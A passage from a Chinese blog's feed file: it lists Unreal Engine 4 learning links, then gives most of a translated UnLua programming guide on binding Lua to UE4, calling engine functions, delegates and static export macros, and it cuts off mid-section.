href="https://zhuanlan.zhihu.com/p/24005952">https://zhuanlan.zhihu.com/p/24005952</a></p></li><li><p>10.总结：<br><a href="https://zhuanlan.zhihu.com/p/24170697">https://zhuanlan.zhihu.com/p/24170697</a></p></li></ul><h3 id="UObject详解："><a href="#UObject详解：" class="headerlink" title="UObject详解："></a>UObject详解：</h3><ul><li><p>1.开篇<br><a href="https://zhuanlan.zhihu.com/p/24319968">https://zhuanlan.zhihu.com/p/24319968</a></p></li><li><p>2.</p></li></ul><h3 id="容器："><a href="#容器：" class="headerlink" title="容器："></a>容器：</h3><ul><li><p>数组TArray：<br><a href="https://docs.unrealengine.com/4.26/zh-CN/ProgrammingAndScripting/ProgrammingWithCPP/UnrealArchitecture/TArrays/">https://docs.unrealengine.com/4.26/zh-CN/ProgrammingAndScripting/ProgrammingWithCPP/UnrealArchitecture/TArrays/</a></p></li><li><p>映射TMap：<br><a href="https://docs.unrealengine.com/4.26/zh-CN/ProgrammingAndScripting/ProgrammingWithCPP/UnrealArchitecture/TMap/">https://docs.unrealengine.com/4.26/zh-CN/ProgrammingAndScripting/ProgrammingWithCPP/UnrealArchitecture/TMap/</a></p></li><li><p>集合TSet：<br><a href="https://docs.unrealengine.com/4.26/zh-CN/ProgrammingAndScripting/ProgrammingWithCPP/UnrealArchitecture/TSet/">https://docs.unrealengine.com/4.26/zh-CN/ProgrammingAndScripting/ProgrammingWithCPP/UnrealArchitecture/TSet/</a></p></li></ul><h3 id="杂项："><a href="#杂项：" class="headerlink" title="杂项："></a>杂项：</h3><ul><li><p>TSubClassOf：<br><a href="https://docs.unrealengine.com/4.26/zh-CN/ProgrammingAndScripting/ProgrammingWithCPP/UnrealArchitecture/TSubclassOf/">https://docs.unrealengine.com/4.26/zh-CN/ProgrammingAndScripting/ProgrammingWithCPP/UnrealArchitecture/TSubclassOf/</a></p></li><li><p>Cast原理：<br><a href="https://blog.csdn.net/zzk1995/article/details/49877469/">https://blog.csdn.net/zzk1995/article/details/49877469/</a></p></li><li><p>UE4性能优化：<br><a href="https://blog.csdn.net/qq_42145322/article/details/100924919">https://blog.csdn.net/qq_42145322/article/details/100924919</a></p></li><li><p>智能指针：<br><a href="https://blog.csdn.net/qq_39481248/article/details/118966678">https://blog.csdn.net/qq_39481248/article/details/118966678</a></p></li><li><p>智能指针使用技巧：<br><a href="https://blog.csdn.net/qq_29667889/article/details/109308111">https://blog.csdn.net/qq_29667889/article/details/109308111</a></p></li><li><p>关闭创建类时编译：<br><a href="https://zhuanlan.zhihu.com/p/370211758">https://zhuanlan.zhihu.com/p/370211758</a></p></li><li><p>TWeakObjectPtr的使用：<br><a href="https://zhuanlan.zhihu.com/p/139473097">https://zhuanlan.zhihu.com/p/139473097</a></p></li><li><p>TWeakObjectPtr相关分析杂谈：<br><a href="https://zhuanlan.zhihu.com/p/68376750">https://zhuanlan.zhihu.com/p/68376750</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
          <category> 程序 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教学文档 </tag>
            
            <tag> UE4 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Lua讲解</title>
      <link href="/2021/08/29/UnLua_Programming_Guide_CN/"/>
      <url>/2021/08/29/UnLua_Programming_Guide_CN/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>UnLua是一个功能丰富并且高效的UE4脚本编程解决方案。开发者可以使用Lua来开发游戏逻辑，并且它允许我们利用Lua的热加载功能来更快地更新游戏逻辑。这份文档将会介绍UnLua的主要功能以及最基础的编程模式。</p><hr><h1 id="Lua和引擎的绑定"><a href="#Lua和引擎的绑定" class="headerlink" title="Lua和引擎的绑定"></a>Lua和引擎的绑定</h1><p>UnLua提供了一种简单的方法将Lua和游戏引擎相互绑定，包括静态绑定和动态绑定：</p><h2 id="静态绑定"><a href="#静态绑定" class="headerlink" title="静态绑定"></a>静态绑定</h2><h4 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h4><p>你的UCLASS只需要实现接口<strong>IUnLuaInterface</strong>，并在函数**GetModuleName_Implementation()**中返回一个Lua文件路径。</p><h4 id="蓝图"><a href="#蓝图" class="headerlink" title="蓝图"></a>蓝图</h4><p>你的蓝图只需要实现接口<strong>UnLuaInterface</strong>，并在函数**GetModuleName()**中返回一个Lua文件路径。</p><h2 id="动态绑定"><a href="#动态绑定" class="headerlink" title="动态绑定"></a>动态绑定</h2><p>动态绑定适用于运行时创建AActor和UObject</p><h4 id="Actor"><a href="#Actor" class="headerlink" title="Actor"></a>Actor</h4><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> Proj = World:SpawnActor(ProjClass, Transform, ESpawnActorCollisionHandlingMethod.AlwaysSpawn, <span class="built_in">self</span>, <span class="built_in">self</span>.Instigator, <span class="string">&quot;Weapon.BP_DefaultProjectile_C&quot;</span>)</span><br></pre></td></tr></table></figure><p><strong>“Weapon.BP_DefaultProjectile_C”</strong>是一个Lua文件路径.</p><h4 id="Object"><a href="#Object" class="headerlink" title="Object"></a>Object</h4><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> ProxyObj = NewObject(ObjClass, <span class="literal">nil</span>, <span class="literal">nil</span>, <span class="string">&quot;Objects.ProxyObject&quot;</span>)</span><br></pre></td></tr></table></figure><p><strong>“Objects.ProxyObject”</strong>是一个Lua文件路径.</p><h2 id="Lua文件路径"><a href="#Lua文件路径" class="headerlink" title="Lua文件路径"></a>Lua文件路径</h2><p>不论是静态绑定还是动态绑定都需要一个Lua文件路径。它是项目目录**’Content/Script’<strong>的</strong>相对**路径。</p><hr><h1 id="Lua调用引擎"><a href="#Lua调用引擎" class="headerlink" title="Lua调用引擎"></a>Lua调用引擎</h1><p>UnLua提供了两种从Lua端访问引擎的方法：</p><ul><li>使用反射系统动态导出；</li><li>在反射系统外部静态导出类、成员变量、成员函数、全局函数和枚举。</li></ul><h2 id="使用反射系统动态导出"><a href="#使用反射系统动态导出" class="headerlink" title="使用反射系统动态导出"></a>使用反射系统动态导出</h2><p>利用反射系统进行动态导出，使代码简洁、直观，消除了大量的胶水代码。</p><h3 id="访问UCLASS"><a href="#访问UCLASS" class="headerlink" title="访问UCLASS"></a>访问UCLASS</h3><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> Widget = UWidgetBlueprintLibrary.Create(<span class="built_in">self</span>, UClass.Load(<span class="string">&quot;/Game/Core/UI/UMG_Main&quot;</span>))</span><br></pre></td></tr></table></figure><p><strong>UWidgetBlueprintLibrary</strong> 是一个UCLASS。类在Lua里的名称必须是 <strong>PrefixCPP</strong> + <strong>ClassName</strong> + **[<code>_C</code>]**，例如： <strong>AActor</strong> (原生类)， <strong>ABP_PlayerCharacter_C</strong>（蓝图类）</p><h3 id="访问UFUNCTION"><a href="#访问UFUNCTION" class="headerlink" title="访问UFUNCTION"></a>访问UFUNCTION</h3><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">Widget:AddToViewport(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><strong>AddToViewport</strong> 是 <strong>UUserWidget</strong> 的一个UFUNCTION。 <strong>0</strong> 是函数的参数。如果（被标记为 <strong>‘BlueprintCallable’</strong> 或 **’Exec’**的）UFUNCTION的参数拥有默认值，那在Lua代码中可以忽略参数0：</p><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">Widget:AddToViewport()</span><br></pre></td></tr></table></figure><h4 id="输出值处理"><a href="#输出值处理" class="headerlink" title="输出值处理"></a>输出值处理</h4><p>输出值包括 <strong>非常量引用参数</strong> and <strong>返回值参数</strong>。这些输出值分为 <strong>原生类型（bool, integer, number, string）</strong> 和 <strong>非原生类型 （用户自定义数据）</strong>。</p><h5 id="非常量引用参数"><a href="#非常量引用参数" class="headerlink" title="非常量引用参数"></a>非常量引用参数</h5><h6 id="原生类型"><a href="#原生类型" class="headerlink" title="原生类型"></a>原生类型</h6><p>Lua代码：</p><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> Level, Health, Name = <span class="built_in">self</span>:GetPlayerBaseInfo()</span><br></pre></td></tr></table></figure><h6 id="非原生类型"><a href="#非原生类型" class="headerlink" title="非原生类型"></a>非原生类型</h6><p>他们在Lua中有两种调用的方法：</p><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> HitResult = FHitResult()</span><br><span class="line"><span class="built_in">self</span>:GetHitResult(HitResult)</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> HitResult = <span class="built_in">self</span>:GetHitResult()</span><br></pre></td></tr></table></figure><p>第一种方法和C++极为相似，当调用多次（比如在循环中）时，它比第二种方法效率高得多。</p><h5 id="返回值参数"><a href="#返回值参数" class="headerlink" title="返回值参数"></a>返回值参数</h5><h6 id="原生类型-1"><a href="#原生类型-1" class="headerlink" title="原生类型"></a>原生类型</h6><p>Lua代码：</p><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> MeleeDamage = <span class="built_in">self</span>:GetMeleeDamage()</span><br></pre></td></tr></table></figure><h6 id="非原生类型-1"><a href="#非原生类型-1" class="headerlink" title="非原生类型"></a>非原生类型</h6><p>他在Lua中有三种调用方式：</p><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> Location = <span class="built_in">self</span>:GetCurrentLocation()</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> Location = FVector()</span><br><span class="line"><span class="built_in">self</span>:GetCurrentLocation(Location)</span><br></pre></td></tr></table></figure><p>以及</p><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> Location = FVector()</span><br><span class="line"><span class="keyword">local</span> LocationCopy = <span class="built_in">self</span>:GetCurrentLocation(Location)</span><br></pre></td></tr></table></figure><p>第一种方法最为直观，事实上，当调用多次（比如在循环中）时，后两种方法要比第一种方法效率高得多。最后一种方法等价于：</p><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> Location = FVector()</span><br><span class="line"><span class="built_in">self</span>:GetCurrentLocation(Location)</span><br><span class="line"><span class="keyword">local</span> LocationCopy = Location</span><br></pre></td></tr></table></figure><h4 id="潜在功能"><a href="#潜在功能" class="headerlink" title="潜在功能"></a>潜在功能</h4><p>潜在功能允许开发人员使用同步调用风格开发异步逻辑。一个典型的潜在功能例子是<strong>Delay</strong>：</p><p>你可以在Lua协程中调用潜在功能：</p><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="built_in">coroutine</span>.<span class="built_in">resume</span>(</span><br><span class="line"><span class="built_in">coroutine</span>.<span class="built_in">create</span>(</span><br><span class="line">    <span class="function"><span class="keyword">function</span><span class="params">(GameMode, Duration)</span></span></span><br><span class="line">        UKismetSystemLibrary.Delay(GameMode, Duration)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    ), <span class="built_in">self</span>, <span class="number">5.0</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><h4 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h4><p>UnLua对UFUNCTION的调用进行了以下几点优化：</p><ul><li>持久的缓冲参数</li><li>优化局部函数调用</li><li>优化参数传递</li><li>优化输出值处理</li></ul><h3 id="访问USTRUCT"><a href="#访问USTRUCT" class="headerlink" title="访问USTRUCT"></a>访问USTRUCT</h3><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> Position = FVector()</span><br></pre></td></tr></table></figure><p><strong>FVector</strong> 是一个USTRUCT。</p><h3 id="访问UPROPERTY"><a href="#访问UPROPERTY" class="headerlink" title="访问UPROPERTY"></a>访问UPROPERTY</h3><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> Position = FVector()</span><br><span class="line">Position.X = <span class="number">256.0</span></span><br></pre></td></tr></table></figure><p><strong>X</strong> 是 <strong>FVector</strong> 的一个UPROPERTY。</p><h4 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h4><ul><li><p>绑定</p><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">FloatTrack.InterpFunc:Bind(<span class="built_in">self</span>, BP_PlayerCharacter_C.OnZoomInOutUpdate)</span><br></pre></td></tr></table></figure></li><li><p><em>InterpFunc</em>* 是 FTimelineFloatTrack 的代理， <strong>‘Bind’</strong> 为 <strong>InterpFunc</strong> 绑定了一个回调函数 （<strong>BP_PlayerCharacter_C.OnZoomInOutUpdate</strong>）。</p></li><li><p>解除绑定</p><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">FloatTrack.InterpFunc:Unbind()</span><br></pre></td></tr></table></figure></li><li><p><em>InterpFunc</em>* 是 FTimelineFloatTrack 的代理， <strong>‘Unbind’</strong> 解除了 <strong>InterpFunc</strong> 所绑定的回调函数。</p></li><li><p>执行</p><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">FloatTrack.InterpFunc:Execute(<span class="number">0.5</span>)</span><br></pre></td></tr></table></figure></li><li><p><em>InterpFunc</em>* 是 FTimelineFloatTrack 的代理， <strong>‘Execute’</strong> 调用了绑定到<strong>InterpFunc</strong>对象上的函数。</p></li></ul><h4 id="多播代理"><a href="#多播代理" class="headerlink" title="多播代理"></a>多播代理</h4><ul><li><p>添加</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">self.ExitButton.OnClicked:Add(self, UMG_Main_C.OnClicked_ExitButton)</span><br></pre></td></tr></table></figure></li><li><p><em>OnClicked</em>* 是 UButton 的一个多播代理，**’Add’** 为 <strong>OnClicked</strong> 添加了一个回调（<strong>UMG_Main_C.OnClicked_ExitButton</strong>）。</p></li><li><p>移除</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">self.ExitButton.OnClicked:Remove(self, UMG_Main_C.OnClicked_ExitButton)</span><br></pre></td></tr></table></figure></li><li><p><em>OnClicked</em>* 是 UButton 的一个多播代理，**’Remove’** 在 <strong>OnClicked</strong> 上移除了一个回调（<strong>UMG_Main_C.OnClicked_ExitButton</strong>）。</p></li><li><p>清除</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">self.ExitButton.OnClicked:Clear()</span><br></pre></td></tr></table></figure></li><li><p><em>OnClicked</em>* 是 UButton 的一个多播代理，**’Clear’** 清除了在 <strong>OnClicked</strong> 上的所有回调。</p></li><li><p>广播</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">self.ExitButton.OnClicked:Broadcast()</span><br></pre></td></tr></table></figure></li><li><p><em>OnClicked</em>* 是 UButton 的一个多播代理，**’Broadcast’** 调用了所有绑定在 <strong>OnClicked</strong> 对象上的函数。</p></li></ul><h3 id="访问UENUM"><a href="#访问UENUM" class="headerlink" title="访问UENUM"></a>访问UENUM</h3><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">Weapon:K2_AttachToComponent(Point, <span class="literal">nil</span>, EAttachmentRule.SnapToTarget, EAttachmentRule.SnapToTarget, EAttachmentRule.SnapToTarget)</span><br></pre></td></tr></table></figure><p><strong>EAttachmentRule</strong> 是一个枚举，<strong>SnapToTarget</strong> 是一个 <strong>EAttachmentRule</strong> 类型的枚举值。</p><h4 id="自定义碰撞枚举"><a href="#自定义碰撞枚举" class="headerlink" title="自定义碰撞枚举"></a>自定义碰撞枚举</h4><ul><li><p>EObjectTypeQuery</p><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> ObjectTypes = TArray(EObjectTypeQuery)</span><br><span class="line">ObjectTypes:Add(EObjectTypeQuery.Player)</span><br><span class="line">ObjectTypes:Add(EObjectTypeQuery.Enemy)</span><br><span class="line">ObjectTypes:Add(EObjectTypeQuery.Projectile)</span><br><span class="line"><span class="keyword">local</span> bHit = UKismetSystemLibrary.LineTraceSingleForObjects(<span class="built_in">self</span>, Start, End, ObjectTypes, <span class="literal">false</span>, <span class="literal">nil</span>, EDrawDebugTrace.None, HitResult, <span class="literal">true</span>)</span><br></pre></td></tr></table></figure></li><li><p><em>EObjectTypeQuery.Player<strong>，</strong>EObjectTypeQuery.Enemy*</em> 以及 <strong>EObjectTypeQuery.Projectile</strong> 都是自定义对象通道。</p></li><li><p>ETraceTypeQuery</p><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> bHit = UKismetSystemLibrary.LineTraceSingle(<span class="built_in">self</span>, Start, End, ETraceTypeQuery.Weapon, <span class="literal">false</span>, <span class="literal">nil</span>, EDrawDebugTrace.None, HitResult, <span class="literal">true</span>)</span><br></pre></td></tr></table></figure></li><li><p><em>ETraceTypeQuery.Weapon</em>* 是一个自定义跟踪通道。</p></li></ul><h3 id="手动导出库"><a href="#手动导出库" class="headerlink" title="手动导出库"></a>手动导出库</h3><p>出于灵活性与性能考虑，UnLua在引擎中手动导出了几个重要的类，包括以下（详见代码）：</p><h4 id="基础类"><a href="#基础类" class="headerlink" title="基础类"></a>基础类</h4><ul><li>UObject</li><li>UClass</li><li>UWorld</li></ul><h4 id="常见容器"><a href="#常见容器" class="headerlink" title="常见容器"></a>常见容器</h4><ul><li>TArray</li><li>TSet</li><li>TMap</li></ul><h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> Indices = TArray(<span class="number">0</span>)</span><br><span class="line">Indices:Add(<span class="number">1</span>)</span><br><span class="line">Indices:Add(<span class="number">3</span>)</span><br><span class="line">Indices:Remove(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">local</span> NbIndices = Indices:Length()</span><br></pre></td></tr></table></figure><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> Vertices = TArray(FVector)</span><br><span class="line"><span class="keyword">local</span> Actors = TArray(AActor)</span><br></pre></td></tr></table></figure><h4 id="数学库"><a href="#数学库" class="headerlink" title="数学库"></a>数学库</h4><ul><li>FVector</li><li>FVector2D</li><li>FVector4</li><li>FQuat</li><li>FRotator</li><li>FTransform</li><li>FColor</li><li>FLinearColor</li><li>FIntPoint</li><li>FIntVector</li></ul><h2 id="静态导出"><a href="#静态导出" class="headerlink" title="静态导出"></a>静态导出</h2><p>UnLua提供了一个简单的解决方案，可以在反射系统外部静态地导出类、成员变量、成员函数、全局函数和枚举。</p><h3 id="类"><a href="#类" class="headerlink" title="类"></a>类</h3><ul><li><p>没有反射的类</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">BEGIN_EXPORT_CLASS</span>(ClassType, ...)</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">BEGIN_EXPORT_NAMED_CLASS</span>(ClassName, ClassType, ...)</span><br></pre></td></tr></table></figure></li><li><p><em>‘…’</em>* 表示构造函数中参数的类型列表。</p></li><li><p>有反射的类</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">BEGIN_EXPORT_REFLECTED_CLASS</span>(UObjectType)</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">BEGIN_EXPORT_REFLECTED_CLASS</span>(NonUObjectType, ...)</span><br></pre></td></tr></table></figure></li><li><p><em>‘…’</em>* 表示构造函数中参数的类型列表。</p></li></ul><h4 id="成员变量"><a href="#成员变量" class="headerlink" title="成员变量"></a>成员变量</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ADD_PROPERTY</span>(Property)</span><br></pre></td></tr></table></figure><p>或者（用于bitfield的bool属性）</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ADD_BITFIELD_BOOL_PROPERTY</span>(Property)</span><br></pre></td></tr></table></figure><h4 id="成员函数"><a href="#成员函数" class="headerlink" title="成员函数"></a>成员函数</h4><h5 id="非静态成员函数"><a href="#非静态成员函数" class="headerlink" title="非静态成员函数"></a>非静态成员函数</h5><ul><li><p>紧凑型风格</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ADD_FUNCTION</span>(Function)</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ADD_NAMED_FUNCTION</span>(Name, Function)</span><br></pre></td></tr></table></figure></li><li><p>完全型风格</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ADD_FUNCTION_EX</span>(Name, RetType, Function, ...)</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ADD_CONST_FUNCTION_EX</span>(Name, RetType, Function, ...)</span><br></pre></td></tr></table></figure></li><li><p><em>‘…’</em>* 为参数类型列表。</p></li></ul><h5 id="静态成员函数"><a href="#静态成员函数" class="headerlink" title="静态成员函数"></a>静态成员函数</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ADD_STATIC_FUNCTION</span>(Function)</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ADD_STATIC_FUNCTION_EX</span>(Name, RetType, Function, ...)</span><br></pre></td></tr></table></figure><p><strong>‘…’</strong> 为参数类型列表。</p><h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Vec3</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="built_in">Vec3</span>() : <span class="built_in">x</span>(<span class="number">0</span>), <span class="built_in">y</span>(<span class="number">0</span>), <span class="built_in">z</span>(<span class="number">0</span>) &#123;&#125;</span><br><span class="line"><span class="built_in">Vec3</span>(<span class="keyword">float</span> _x, <span class="keyword">float</span> _y, <span class="keyword">float</span> _z) : <span class="built_in">x</span>(_x), <span class="built_in">y</span>(_y), <span class="built_in">z</span>(_z) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Set</span><span class="params">(<span class="keyword">const</span> Vec3 &amp;V)</span> </span>&#123; *<span class="keyword">this</span> = V; &#125;</span><br><span class="line"><span class="function">Vec3&amp; <span class="title">Get</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> *<span class="keyword">this</span>; &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Get</span><span class="params">(Vec3 &amp;V)</span> <span class="keyword">const</span> </span>&#123; V = *<span class="keyword">this</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span>==(<span class="keyword">const</span> Vec3 &amp;V) <span class="keyword">const</span> &#123; <span class="keyword">return</span> x == V.x &amp;&amp; y == V.y &amp;&amp; z == V.z; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> Vec3 <span class="title">Cross</span><span class="params">(<span class="keyword">const</span> Vec3 &amp;A, <span class="keyword">const</span> Vec3 &amp;B)</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">Vec3</span>(A.y * B.z - A.z * B.y, A.z * B.x - A.x * B.z, A.x * B.y - A.y * B.x); &#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> Vec3 <span class="title">Multiply</span><span class="params">(<span class="keyword">const</span> Vec3 &amp;A, <span class="keyword">float</span> B)</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">Vec3</span>(A.x * B, A.y * B, A.z * B); &#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> Vec3 <span class="title">Multiply</span><span class="params">(<span class="keyword">const</span> Vec3 &amp;A, <span class="keyword">const</span> Vec3 &amp;B)</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">Vec3</span>(A.x * B.x, A.y * B.y, A.z * B.z); &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">float</span> x, y, z;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">BEGIN_EXPORT_CLASS</span>(Vec3, <span class="keyword">float</span>, <span class="keyword">float</span>, <span class="keyword">float</span>)</span><br><span class="line"><span class="built_in">ADD_PROPERTY</span>(x)</span><br><span class="line"><span class="built_in">ADD_PROPERTY</span>(y)</span><br><span class="line"><span class="built_in">ADD_PROPERTY</span>(z)</span><br><span class="line"><span class="built_in">ADD_FUNCTION</span>(Set)</span><br><span class="line"><span class="built_in">ADD_NAMED_FUNCTION</span>(<span class="string">&quot;Equals&quot;</span>, <span class="keyword">operator</span>==)</span><br><span class="line"><span class="built_in">ADD_FUNCTION_EX</span>(<span class="string">&quot;Get&quot;</span>, Vec3&amp;, Get)</span><br><span class="line"><span class="built_in">ADD_CONST_FUNCTION_EX</span>(<span class="string">&quot;GetCopy&quot;</span>, <span class="keyword">void</span>, Get, Vec3&amp;)</span><br><span class="line"><span class="built_in">ADD_STATIC_FUNCTION</span>(Cross)</span><br><span class="line"><span class="built_in">ADD_STATIC_FUNCTION_EX</span>(<span class="string">&quot;MulScalar&quot;</span>, Vec3, Multiply, <span class="keyword">const</span> Vec3&amp;, <span class="keyword">float</span>)</span><br><span class="line"><span class="built_in">ADD_STATIC_FUNCTION_EX</span>(<span class="string">&quot;MulVec&quot;</span>, Vec3, Multiply, <span class="keyword">const</span> Vec3&amp;, <span class="keyword">const</span> Vec3&amp;)</span><br><span class="line"><span class="built_in">END_EXPORT_CLASS</span>()</span><br><span class="line"><span class="built_in">IMPLEMENT_EXPORTED_CLASS</span>(Vec3)</span><br></pre></td></tr></table></figure><h3 id="全局函数"><a href="#全局函数" class="headerlink" title="全局函数"></a>全局函数</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">EXPORT_FUNCTION</span>(RetType, Function, ...)</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXPORT_FUNCTION_EX(Name, RetType, Function, ...)</span><br></pre></td></tr></table></figure><p><strong>‘…’</strong> 为参数类型列表。</p><h4 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetEngineVersion</span><span class="params">(int32 &amp;MajorVer, int32 &amp;MinorVer, int32 &amp;PatchVer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">MajorVer = ENGINE_MAJOR_VERSION;</span><br><span class="line">MinorVer = ENGINE_MINOR_VERSION;</span><br><span class="line">PatchVer = ENGINE_PATCH_VERSION;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">EXPORT_FUNCTION</span>(<span class="keyword">void</span>, GetEngineVersion, int32&amp;, int32&amp;, int32&amp;)</span><br></pre></td></tr></table></figure><h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><ul><li>普通枚举</li></ul><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">EHand</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">LeftHand,</span><br><span class="line">RightHand</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">BEGIN_EXPORT_ENUM</span>(EHand)</span><br><span class="line"><span class="built_in">ADD_ENUM_VALUE</span>(LeftHand)</span><br><span class="line"><span class="built_in">ADD_ENUM_VALUE</span>(RightHand)</span><br><span class="line"><span class="built_in">END_EXPORT_ENUM</span>(EHand)</span><br></pre></td></tr></table></figure><ul><li>作用域为类的枚举</li></ul><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="keyword">class</span> <span class="title">EEye</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">LeftEye,</span><br><span class="line">RightEye</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">BEGIN_EXPORT_ENUM</span>(EEye)</span><br><span class="line"><span class="built_in">ADD_SCOPED_ENUM_VALUE</span>(LeftEye)</span><br><span class="line"><span class="built_in">ADD_SCOPED_ENUM_VALUE</span>(RightEye)</span><br><span class="line"><span class="built_in">END_EXPORT_ENUM</span>(EEye)</span><br></pre></td></tr></table></figure><h2 id="可选“UE4”名称空间"><a href="#可选“UE4”名称空间" class="headerlink" title="可选“UE4”名称空间"></a>可选“UE4”名称空间</h2><p>UnLua提供了一个选项来添加一个命名空间**’UE4’<strong>到引擎中的所有类和枚举。你可以在</strong>UnLua.Build.cs**中找到这个选项。</p><p>如果这个选项被开启，你的Lua代码应该是这样子：</p><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> Position = UE4.FVector()</span><br></pre></td></tr></table></figure><hr><h1 id="引擎调用Lua"><a href="#引擎调用Lua" class="headerlink" title="引擎调用Lua"></a>引擎调用Lua</h1><p>UnLua提供了一个类似蓝图的解决方案来跨越C++/Script的边界。它允许C++/Blueprint代码调用在Lua代码中定义的函数。</p><h2 id="覆写蓝图事件"><a href="#覆写蓝图事件" class="headerlink" title="覆写蓝图事件"></a>覆写蓝图事件</h2><p>你可以在Lua代码里覆写所有的<strong>蓝图事件</strong>。<strong>蓝图事件</strong>包括：</p><ul><li>被标记为 <strong>‘BlueprintImplementableEvent’</strong> 的UFUNCTION</li><li>被标记为 <strong>‘BlueprintNativeEvent’</strong> 